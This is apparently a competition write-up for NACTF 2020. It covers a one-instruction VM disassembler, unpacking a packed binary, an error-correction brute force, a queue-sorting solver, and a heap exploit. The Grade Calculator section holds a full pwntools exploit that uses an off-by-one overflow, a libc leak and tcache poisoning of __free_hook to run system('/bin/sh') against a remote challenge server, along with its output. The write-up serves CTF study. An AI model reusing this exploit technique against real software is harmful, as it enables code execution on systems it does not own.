---
title: NACTF 2020
date: 2020-11-04
slug: /writeups/nactf-2020
excerpt: Required writeups for winning teams.
---

Required writeups for winning teams. <!-- end -->
> Writeups are required for prize winning teams for gfc3, packed, gcalc, error 2, veggie factory 5. Format for writeups: gcalc, error 2, and veggie factory 5 can be just code. gfc3: dissassembler or written description of solve method. Packed: written explanation of how you reversed engineered and what the program does.

# Generic Flag Checker® 3
From the challenge description alone this is obviously a VM. It only has one instruction (mov), but there are some interesting sources and destinations:

  - constant number
  - register (including PC)
  - input/output
  - memory location
  - arithmetic operation

My disassembler attempts to follow the real VM as close as possible, and it was written following the decompilation from Ghidra. Some of the register and variable names do not match what they actually do, because I named them before fully reversing the VM.

```py
import sys
import struct

class Instruction:
  def __init__(self, opcode=0, offset=0, operand=0, extra=0):
    self.opcode = opcode
    self.offset = offset
    self.operand = operand
    self.extra = extra

def get_instruction(pc, code):
  start = pc
  opcode = code[pc]
  operand = code[pc+1]
  pc += 2
  num, offset = (operand>>4), (operand&0xf)
  ins = Instruction(opcode=opcode, offset=offset)
  if opcode>>7 == 0:
    ins.operand = num
  elif num < 3:
    length = 2**num
    ins.operand = struct.unpack("<Q", code[pc:pc+length].ljust(8, b"\x00"))[0]
    pc += length
  else:
    ins.extra = num
  return pc, ins, code[start:pc]

conditions = [
  "", "Z", "NZ", "C", "NC", "NC&NZ", "C|Z", "O^S", "O==S"
]

load_funcs = {
  4: "[C]",
  5: "READ",
}

regs = ["PC", *"ABCDEFGHIJKLMNO"]

store_funcs = {
  4: "[C]",
  5: "WRITE",
}

math = [
  "ADD", "SUB", "AND", "OR", "XOR"
]

sizes = [
  "B", "W", ""
]

def decode(ins):
  condition = conditions[ins.opcode&0xf]
  operand = ins.operand
  operation = (ins.opcode >> 4) & 3
  if ins.opcode >> 7:
    if ins.extra != 0:
      return "HALT"
  else:
    if operand in load_funcs:
      operand = load_funcs[operand]
    else:
      operand = regs[operand]
  offset = ins.offset
  if offset == 1:
    return f"{math[operand]} A, H, I"
  if offset in store_funcs:
    offset = store_funcs[offset]
  else:
    offset = regs[offset]
  if isinstance(operand, int):
    operand = f"0x{operand:x}"
  if offset == "PC":
    return f"J{sizes[operation]}{condition} {operand}"
  return f"MOV{sizes[operation]}{condition} {offset}, {operand}"

def disasm(code, pc=0):
  while pc < len(code):
    try:
      new, ins, insbytes = get_instruction(pc, code)
      display = decode(ins)
      print(f"0x{pc:04x} {insbytes.hex():>12s} : {display}")
      pc = new
    except:
      break

if __name__=="__main__":
  if len(sys.argv) > 1:
    pc = 0
    if len(sys.argv) > 2:
      pc = sys.argv[2]
      if pc[:2] == "0x":
        pc = int(pc, 16)
      else:
        pc = int(pc)
    disasm(open(sys.argv[1], "rb").read(), pc)
  else:
    print(f"usage: {sys.argv[0]} filename [offset]")
```

This doesn't handle branching though, so I just started disassembly at a certain offset by hand. I attempted to write both a Ghidra processor specification as well as a Binary Ninja plugin (both semi-functional), but gfc3 was simple enough that this python script was more than sufficient, and gfc4 was too complex for any of my tools to disassemble.

First, the program writes an encoded buffer.

```
0x0006 a02388010000 : MOV C, 0x188
0x000c a02a55728fdc : MOV J, 0xdc8f7255
0x000e         2048 : MOV H, [C]
0x0010         20a9 : MOV I, J
0x0013       800104 : XOR A, H, I
0x0015         2014 : MOV [C], A
0x0017         2038 : MOV H, C
0x001a       a00904 : MOV I, 0x4
0x001d       800100 : ADD A, H, I
0x001f         2013 : MOV C, A
0x0021         2038 : MOV H, C
0x0027 a029c8010000 : MOV I, 0x1c8
0x002a       800101 : SUB A, H, I
0x0030 a3200c000000 : JC 0xc
```

Note that at the end we get the correct message if N is 0, so this is our goal. After writing the encoded buffer above, it prints the first question, inputs one character into K, then sets N to K^0x43. Therefore, the first letter must be 0x43, or C.

```
// read character, discard newline
0x0042         205b : MOV K, READ
0x0044         2058 : MOV H, READ
0x0046         20b8 : MOV H, K
0x0048       a00943 : MOV I, 0x43
0x004b       800104 : XOR A, H, I
// n = input ^ 0x43
0x004e         201e : MOV N, A
```

Next it inputs the flag, then loops through the input and encoded buffer, comparing each character and then doing M = (M+K)&0x3f each time.

```
// start at 0x1c8, index in L
0x0087 a02cc8010000 : MOV L, 0x1c8
0x008d a02d00000000 : MOV M, 0x0
0x0093       a00600 : MOV F, 0x0
0x0096       a00700 : MOV G, 0x0
// begin loop
0x0099         20c3 : MOV C, L
// input char
0x009b         0046 : MOVB F, [C]

// start at 0x188, index in M
0x009d a02888010000 : MOV H, 0x188
0x00a3         20d9 : MOV I, M
0x00a5       800100 : ADD A, H, I
0x00a8         2013 : MOV C, A
// encoded char
0x00aa         0047 : MOVB G, [C]

// input ^ encoded
0x00ac         2068 : MOV H, F
0x00ae         2079 : MOV I, G
0x00b0       800104 : XOR A, H, I
0x00b3         2018 : MOV H, A
// set N if not equal
0x00b5       a20e01 : MOVNZ N, 0x1
// L = L+1
0x00b8         20c8 : MOV H, L
0x00ba       a00901 : MOV I, 0x1
0x00bd       800100 : ADD A, H, I
0x00c0         201c : MOV L, A
// M = (M+K)&0x3f
0x00c2         20d8 : MOV H, M
0x00c4         20b9 : MOV I, K
0x00c6       800100 : ADD A, H, I
0x00c9         2018 : MOV H, A
0x00cb       a0093f : MOV I, 0x3f
0x00ce       800102 : AND A, H, I
0x00d1         201d : MOV M, A
// loop if L < 0x208
0x00d3         20c8 : MOV H, L
0x00d5 a02908020000 : MOV I, 0x208
0x00db       800101 : SUB A, H, I
0x00de a32099000000 : JC 0x99
```

Doing some math, 0x43 & 0x3f = 3 and (0x43 + 0x3f) & 0x3f = 2. Could've probably guessed it from the beginning, but it's nice to reverse the whole thing anyway.

```
>>> s = "n41algclgty3f_r{03tndhe_3_v_1mtn_rs14tsnr_sutpc30tcr1ht0n_n1t}cr"
>>> print(s[::3] + s[2::3] + s[1::3])
nactf{th3_tr4nsp0rt_tr1gg3r3d_vm_1s_t3chn1c4lly_0ne_1nstruct10n}
```

# Packed
From the challenge description, we can guess that this is some sort of binary packing, though a quick look at the disassembly reveals that it is a custom implementation. Rather than try to reverse engineer it, I just set a breakpoint at `0x10f6` and copied the unpacked data out into a file.

```
$ head -c 50 bin | disasm -c amd64
   0:    48 8d 3d f9 3f 00 00     lea    rdi,  [rip+0x3ff9]        # 0x4000
   7:    48 8d 0d 42 41 00 00     lea    rcx,  [rip+0x4142]        # 0x4150
   e:    48 29 f9                 sub    rcx,  rdi
  11:    48 8d 35 58 12 00 00     lea    rsi,  [rip+0x1258]        # 0x1270
  18:    48 c1 f9 03              sar    rcx,  0x3
  1c:    f3 48 a5                 rep movs QWORD PTR es:[rdi],  QWORD PTR ds:[rsi]
  1f:    31 c0                    xor    eax,  eax
  21:    e9 ba 00 00 00           jmp    0xe0
        ...         ... ...
```

Looks kind of messy but I threw this in Ghidra anyway. Skipping down to the important bit reveals a few things:

- the flag is read onto the top of the stack
- the flag is 0x40 bytes long
- the function at 0x70 is called, then the function at 0xa0 must return 0

The first two points here are not interesting. The first function at 0x70 XORs the memory starting at 0x4000 up to 0x4140 eight bytes at a time with the QWORD at 0x4140. It seems my dump didn't include this so Ghidra showed an invalid reference. No worries, just grab it out the debugger again.

```
gef➤  x/s 0x00007ffff7fc9000
0x7ffff7fc9000: "RnV&Bba_TG^cNk<at2E2-fpAe{{n3H-s~*xK3]h-NlXIorf;g^Y_cB(gu\",}Tn{vq!po`K@4~J{)c9i=?k3fZ,1+Ib_n.GgFg{0gK_f;ngblEY,1mRIjn?F89_8%oudB]),1w14%d+zfxnS{dDtc?<w_lVkD3Z`usvzN+J3o/_lnqK9@_#~C/s{=P64KW(-v3z=&3jren_x*$04r9njn0S,Py/%n#_98|0s^;~(pw#fW4p-B)c=*sG3MX8(_a\\&ms-zS:mBN~]hi6zw_;(w5m5LdAV0mYv47\"]xEUibHUtNRuYA4hya\"[+Ke&fD2}?^N$*nactf!"
```

The function at 0xa0 is a bit more interesting. Starting at 0x4001, it XORs each character of our input with the byte at the current address and ORs it with the eventual return value (we want it to be 0 at each step so the return value is 0). Then, it adds 5 (not 1) to the address.

Sure enough, cutting off the first letter and taking every fifth character gives the flag.

```
>>> print("RnV&Bba_TG^cNk<at2E2-fpAe{{n3H-s~*xK3]h-NlXIorf;g^Y_cB(gu\",}Tn{vq!po`K@4~J{)c9i=?k3fZ,1+Ib_n.GgFg{0gK_f;ngblEY,1mRIjn?F89_8%oudB]),1w14%d+zfxnS{dDtc?<w_lVkD3Z`usvzN+J3o/_lnqK9@_#~C/s{=P64KW(-v3z=&3jren_x*$04r9njn0S,Py/%n#_98|0s^;~(pw#fW4p-B)c=*sG3MX8(_a\\&ms-zS:mBN~]hi6zw_;(w5m5LdAV0mYv47\"]xEUibHUtNRuYA4hya\"[+Ke&fD2}?^N$*nactf!"[1::5])
nactf{s3lf_unp4ck1ng_b1n_d1dnt_3v3n_s4v3_4ny_sp4c3_smh_mV4EUYae}*f
```

# Grade Calculator
Off-by-one in grade entering allows overwriting one byte past the end of the chunk, which enables expanding a chunk to overlap with another.
```python
from pwn import *

exe = ELF("./gcalc")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

host = args.HOST or "challenges.ctfd.io"
port = args.PORT or 30253

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

gdbscript = f'''
file {exe.path}
 '''

r = conn()

# good luck pwning :)

CATEGORY = 0

def add(weight, grades):
  global CATEGORY
  r.sendlineafter(">", "1")
  r.sendlineafter("(1-100)", str(weight))
  r.sendlineafter("category?", str(grades))
  CATEGORY += 1
  return CATEGORY

def write(idx, size, grades=b""):
  r.sendlineafter(">", "2")
  r.sendlineafter("(1-16)", str(idx))
  r.recvuntil("(n to keep")
  if size:
    r.sendline(str(size))
  else:
    r.sendline("n")
  for grade in grades:
    r.sendline(str(grade))

def view():
  r.sendlineafter(">", "3")

# set up chunks
overflow = add(1, 24)   # 24 means 0 padding
evil = add(1, 20)       # change the size of this...
victim = add(1, 20)     # ...to overwrite this

# get leek
unsorted = add(1, 2048)         # add chunk of unsorted size
add(1, 20)                      # prevent consolidation
write(unsorted, 1, b"\x41"*2)   # free the unsorted chunk
unsorted = add(1, 8)            # get chunk from unsorted
view()                          # deets!

r.recvuntil(f"Category #{unsorted}:")
r.recvuntil("Grades: ")

convert = lambda x: int(x).to_bytes(byteorder="little", length=1, signed=True)
leak = b''.join(map(convert, r.recvline().split(b", ")))
libc.address = u64(leak) - 0x3ebca0
log.info(f"{libc.address:x}")

# overflow first chunk to get overlapping chunks
write(overflow, 0, b"\x41"*24+b"\x91")  # overflow first chunk to set evil's size to 0x90
write(victim, 0x38, b"\x41"*0x39)       # free the victim and put new chunk somewhere else

# tcache poison
payload = b"\x41"*24 + b"\x21" + b"\x00"*7 + p64(libc.sym["__free_hook"]-8)
payload += b"\x00"*(0x89-len(payload))
write(evil, 0x88, payload)
# get victim back
add(1, 20)
# get free_hook
free_hook = add(1, 15)
write(free_hook, 0, b"/bin/sh\x00"+p64(libc.sym["system"]))
write(free_hook, 1)

# deets!
r.clean()
r.sendline("cat flag.txt")
print(r.recvline())
#r.interactive()
```

```
$ ./solve.py
[*] '/home/darin/ctfs/nactf-2020/pwn/grade/gcalc'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/darin/ctfs/nactf-2020/pwn/grade/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/darin/ctfs/nactf-2020/pwn/grade/ld-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenges.ctfd.io on port 30253: Done
[*] 7fc3c31a3000
b'nactf{0n3_byt3_ch40s_l34d5_t0_h34p_c3rn4g3_PP0SvwNV44uwRSbm}\n'
```

# Error 2
16^4 brute force is really small actually.
```python
from functools import reduce
from itertools import combinations
import binascii

bits = open("error2.txt").read()
bits = [int(b) for b in bits]

for lmao in combinations(range(16), r=4):
  try:
    chunks = [bits[i:i+15] for i in range(0, len(bits), 15)]
    flag = ""
    for chunk in chunks:
      for i, parity in enumerate(reversed([chunk.pop(j) for j in reversed(lmao)])):
        chunk.insert(2**i-1, parity)

      parity = reduce(lambda a, b: a ^ b, [j+1 for j, bit in enumerate(chunk) if bit])
      chunk[parity-1] ^= 1
      for j in range(3, -1, -1):
        chunk.pop(2**j-1)
      #print(chunk)
      flag += ''.join(str(bit) for bit in chunk)

    print(binascii.unhexlify(hex(int(flag, 2))[2:]))
  except:
    pass
```

```
$ python3 solve2.py | grep nactf
b'nactf{err0r_c0rr3cti0n_w1th_th3_c0rr3ct_f1le_q73xer7k9}'
```

# Dr. J's BBOB: Vegetable Factory #5 🥕
This is Stephen Huan's code.

```python
from collections import deque
from pwn import remote
import solve5 as s

# socket I/O
r = remote("challenges.ctfd.io", 30267)
r.sendline("5")
r.recvuntil("order:\n\n")
veggies = r.recvline().strip().decode().split(", ")
r.recvuntil("position. ")
f = lambda x: int(x.strip().split()[0] if x.strip().split()[0][-1] != "." else x.strip().split()[0][:-1])
X, Y, Z, W = map(f, r.recvline().strip().decode().split("position")[1:])
X, Y, Z, W = min(X, Y), max(X, Y), min(W, X), max(W, X)

N = 200
l = sorted(veggies)
d = {l[i]: i for i in range(N)}
l = [d[v] for v in veggies]
q = deque(l)
print(len(veggies))

# s.X, s.Y, s.Z, s.W, s.da, s.db = X, Y, Z, W, Y - X, W - Z
l = s.solve(q)
print(X, Y, Z, W, len(l))
r.sendline(" ".join(l))

print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
```
```python
import random
from collections import deque

def extended_gcd(a: int, b: int) -> tuple:
    """ Returns (gcd(a, b), x, y) such that ax + by = gcd(a, b). """
    x, xp = 0, 1
    y, yp = 1, 0
    r, rp = b, a

    while r != 0:
        q = rp//r
        rp, r = r, rp - q*r
        xp, x = x, xp - q*x
        yp, y = y, yp - q*y

    return rp, xp, yp

def inv(x: int, m: int) -> int:
    """ Returns the inverse y such that xy mod m = 1. """
    return extended_gcd(x, m)[1] % m

N = 200
X, Y, Z, W = 29, 64, 85, 173
da, db, ainv, binv = Y - X, W - Z, -5, 2
sainv, sbinv = inv(7, 40), inv(11, 25)

def c(q: deque) -> str:
    """ Rotates the q left. """
    q.rotate(-1)
    return "c"

def s(q: deque, t: bool) -> str:
    """ Performs a swap. """
    i, j = (X, Y) if t else (Z, W)
    q[i], q[j] = q[j], q[i]
    return "a" if t else "b"

def cycle(q: deque, sol: list, i: int, v: int) -> None:
    """ Rotates until the queue has the value v at index i. """
    while q[i] != v:
        sol.append(c(q))

def propagate(q: deque, sol: list, steps: int, t: bool, d: bool, v: int) -> list:
    """ Propagate an index in a certain direction. """
    touched = []
    i, j = (X, Y) if t else (Z, W)
    for _ in range(steps):
        cycle(q, sol, i if d else j, v)
        touched.append(q[j if d else i])
        sol.append(s(q, t))
    return touched

def move(q: deque, sol: list, steps: int, t: bool, d: bool, v: int) -> list:
    """ Choose the direction of propagate to minimize the number of steps. """
    # alt = (40 if t else 25) - steps
    # print(alt, steps)
    # params = (alt, t, d ^ 1) if alt < steps else (steps, t, d)
    # return propagate(q, sol, *params, v)
    return propagate(q, sol, steps, t, d, v)

def swap(q: deque, sol: list, i: int, j: int) -> None:
    """ Swaps positions i and j in the queue. """
    # if can be done with one cycle, do it with one cycle
    # if (j - i) % 8, the other case automatically zeros sa
    if (j - i) % 5 == 0:
        start, end = q[i], q[j]
        steps = sainv*(j - i)//5 % 40
        steps = steps if steps >= 0 else steps + 40
        # forward propagate
        move(q, sol, steps, True, True, start)
        # backpropagate
        move(q, sol, steps - 1, True, False, end)
        # re-orient
        cycle(q, sol, 0, 0)
        return
    start, end, sa, sb = q[i], q[j], ainv*(j - i) % 40, binv*(j - i) % 25
    sa, sb = sa if sa >= 0 else sa + 40, sb if sb >= 0 else sb + 25
    s1, d1 = min(40 - sa, sa), 40 - sa > sa
    s2, d2 = min(25 - sb, sb), 25 - sb > sb
    # forward propagate
    move(q, sol, s1, True, d1, start)
    move(q, sol, s2, False, d2, start)
    # backpropagate
    move(q, sol, s2 - 1, False, not d2, end)
    move(q, sol, s1, True, not d1, end)
    # re-orient
    cycle(q, sol, 0, 0)

def solve(q: deque) -> list:
    """ Sorts the queue. """
    sol = []
    # make 0 the first value to have well-defined swaps
    cycle(q, sol, 0, 0)
    d = {v: i for i, v in enumerate(q)}
    for i in range(1, len(q)):
        d[q[i]] = d[i]
        swap(q, sol, i, d[i])
    return sol

def test_sol(q: deque) -> bool:
    """ Tests whether the solution is valid. """
    sol = solve(deque(list(q)))
    print(len(sol))
    print(sol.count("a"), sol.count("b"), sol.count("c"))
    for ch in sol:
        {"a": lambda q: s(q, True), "b": lambda q: s(q, False), "c": c}[ch](q)
    return sorted(q) == list(q)

if __name__ == "__main__":
    random.seed(1)

    # q = deque(range(N))
    # sol = []
    # print(q)
    # # p1 = propagate(q, sol, 5, True, False, 1)
    # # propagate(q, sol, 4, True, True, p1[-1])
    # # propagate(q, sol, 35, True, True, 1)
    # # propagate(q, sol, 34, True, False, 26)
    # cycle(q, sol, 0, 0)
    # # swap(q, sol, 1, 6)
    # # swap(q, sol, 2, 11)
    # print(q)
    # print(len(sol))
    # exit()

    l = list(range(N))
    random.shuffle(l)
    q = deque(l)
    print(test_sol(q))
```
